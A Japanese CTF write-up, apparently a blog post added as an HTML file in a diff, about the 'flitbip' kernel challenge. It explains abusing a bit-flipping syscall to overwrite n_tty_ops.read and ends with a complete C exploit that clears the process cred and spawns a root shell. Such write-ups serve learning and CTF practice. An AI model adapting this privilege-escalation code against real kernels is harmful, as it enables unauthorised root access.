@@ -1,0 +1,270 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>baby / kernel exploitation / n_tty_ops
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<h3>1: static</h3>
+<h4>basic</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">basic.sh</div>
+<pre class="prettyprint linenums lang-sh">
+/ # cat /proc/version
+Linux version 4.17.0 (aleph@codin) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)) #1 Fri J8
+
+  -append &quot;nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet&quot; 2&gt;/dev/null \
+</pre>
+<p>SMEP無効・SMAP無効・KASLR無効・oops-&gt;panic</p>
+<p></p>
+<h4>new syscall</h4>
+<p>新しくsyscallが追加されている。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">flitbip.c</div>
+<pre class="prettyprint linenums lang-c">
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/syscalls.h&gt;
+
+#define MAXFLIT 1
+
+#ifndef __NR_FLITBIP
+#define FLITBIP 333
+#endif
+
+long flit_count = 0;
+EXPORT_SYMBOL(flit_count);
+
+SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)
+{
+        if (flit_count &gt;= MAXFLIT)
+        {
+                printk(KERN_INFO &quot;flitbip: sorry :/\n&quot;);
+                return -EPERM;
+        }
+
+        *addr ^= (1ULL &lt;&lt; (bit));
+        flit_count++;
+
+        return 0;
+}
+</pre>
+<p>任意のアドレスの任意のbitを反転させることができる。<code>flist_count</code>によって回数を制限しているが、KASLR無いから<code>flist_count</code>を最初に反転させることで任意回ビット反転ができる。</p>
+<p></p>
+<h3>2: get RIP</h3>
+<p>任意アドレスに任意の値を書き込むことができる状況である。しかもSMEPが無効のため、RIPさえ取れればそれだけで終わる。このような場合には、<code>struct tty_ldisc_ops n_tty_ops</code>を書き換えるのが便利らしい。これはTTY関連の関数テーブルで、新規ターミナルのデフォルトテーブルとして利用され、且つRWになっているもの。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">ex.c</div>
+<pre class="prettyprint linenums lang-c">
+# 構造体
+static struct tty_ldisc_ops n_tty_ops = {
+	.magic           = TTY_LDISC_MAGIC,
+	.name            = &quot;n_tty&quot;,
+	.open            = n_tty_open,
+	.close           = n_tty_close,
+	.flush_buffer    = n_tty_flush_buffer,
+	.read            = n_tty_read,
+	.write           = n_tty_write,
+	.ioctl           = n_tty_ioctl,
+	.set_termios     = n_tty_set_termios,
+	.poll            = n_tty_poll,
+	.receive_buf     = n_tty_receive_buf,
+	.write_wakeup    = n_tty_write_wakeup,
+	.receive_buf2	 = n_tty_receive_buf2,
+};
+# 初期化
+static int __init pps_tty_init(void)
+{
+	int err;
+
+	/* Inherit the N_TTY&#x27;s ops */
+	n_tty_inherit_ops(&amp;pps_ldisc_ops);
+(snipped)
+</pre>
+<p>というわけで、こいつの<code>read</code>を書き換えて<code>scanf()</code>なり<code>gets()</code>なりを呼ぶことでRIPが取れる。</p>
+<p></p>
+<h3>3: LPE</h3>
+<p>あとは、用意したshellcodeを踏ませれば終わり。KASLR無効より<code>current</code>の場所が分かるため直接<code>current-&gt;cred.uid</code>等をNULLクリアする。</p>
+<p></p>
+<h3>4: exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+
+
+// commands
+#define DEV_PATH &quot;&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  setreuid(0, 0);
+  char *argv[] = {&quot;/bin/sh&quot;,NULL};
+  char *envp[] = {NULL};
+  execve(&quot;/bin/sh&quot;,argv,envp);
+}
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+}
+
+const ulong n_tty_ops_read = 0xffffffff8183e320 + 0x30;
+const ulong n_tty_read = 0xffffffff810c8510;
+
+static void shellcode(void){
+  // まずはお直し
+  *((ulong*)n_tty_ops_read) = n_tty_read;
+
+  // そのあとpwn
+  scu current_task = 0xffffffff8182e040;
+  scu cred = current_task + 0x3c0;
+  for(int ix=0; ix!=3; ++ix)
+    ((uint *)cred)[ix] = 0;
+  asm(
+    &quot;swapgs\n&quot;
+    &quot;mov %%rax, %0\n&quot;
+    &quot;push %%rax\n&quot;
+    &quot;mov %%rax, %1\n&quot;
+    &quot;push %%rax\n&quot;
+    &quot;mov %%rax, %2\n&quot;
+    &quot;push %%rax\n&quot;
+    &quot;mov %%rax, %3\n&quot;
+    &quot;push %%rax\n&quot;
+    &quot;mov %%rax, %4\n&quot;
+    &quot;push %%rax\n&quot;
+    &quot;iretq\n&quot;
+    :: &quot;r&quot; (user_ss), &quot;r&quot; (user_sp), &quot;r&quot;(user_rflags), &quot;r&quot; (user_cs), &quot;r&quot; (&amp;NIRUGIRI) : &quot;memory&quot;
+  );
+}
+// (END utils)
+
+// flitbip
+const ulong flit_count = 0xffffffff818f4f78;
+
+long _fff(long *addr, long bit){
+  asm(
+      &quot;mov rax, 333\n&quot;
+      &quot;syscall\n&quot;
+  );
+}
+long fff(long *addr, long bit){
+  long tmp = _fff(addr, bit);
+  assert(tmp == 0);
+  return tmp;
+}
+// (END flitbip)
+
+int main(int argc, char *argv[]) {
+  save_state();
+  int pid = getpid();
+  printf(&quot;[+] my pid: %lx\n&quot;, pid);
+
+  char buf[0x200];
+  printf(&quot;[+] shellcode @ %p\n&quot;, shellcode);
+  ulong flipper = n_tty_read ^ (ulong)&amp;shellcode;
+  fff(flit_count, 63);
+
+  for(int ix=0; ix!=64; ++ix){
+    if(flipper &amp; 1 == 1){
+      fff(n_tty_ops_read, ix);
+    }
+    flipper &gt;&gt;= 1;
+  }
+
+  fgets(buf, sizeof(buf), stdin);
+
+  printf(&quot;[!] unreachable\n&quot;);
+  return 0;
+}
+</pre>
+<p></p>
+<p></p>
+<h3>5: アウトロ</h3>
+<p>違う、こういう問題を解きたいんじゃない。。。。。。。。。。。</p>
+<p>次からは簡単過ぎる問題は飛ばして良さげな問題だけ見繕おうと思います。</p>
+<p></p>
+<p></p>
+<h3>6: 参考</h3>
+<p>1: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
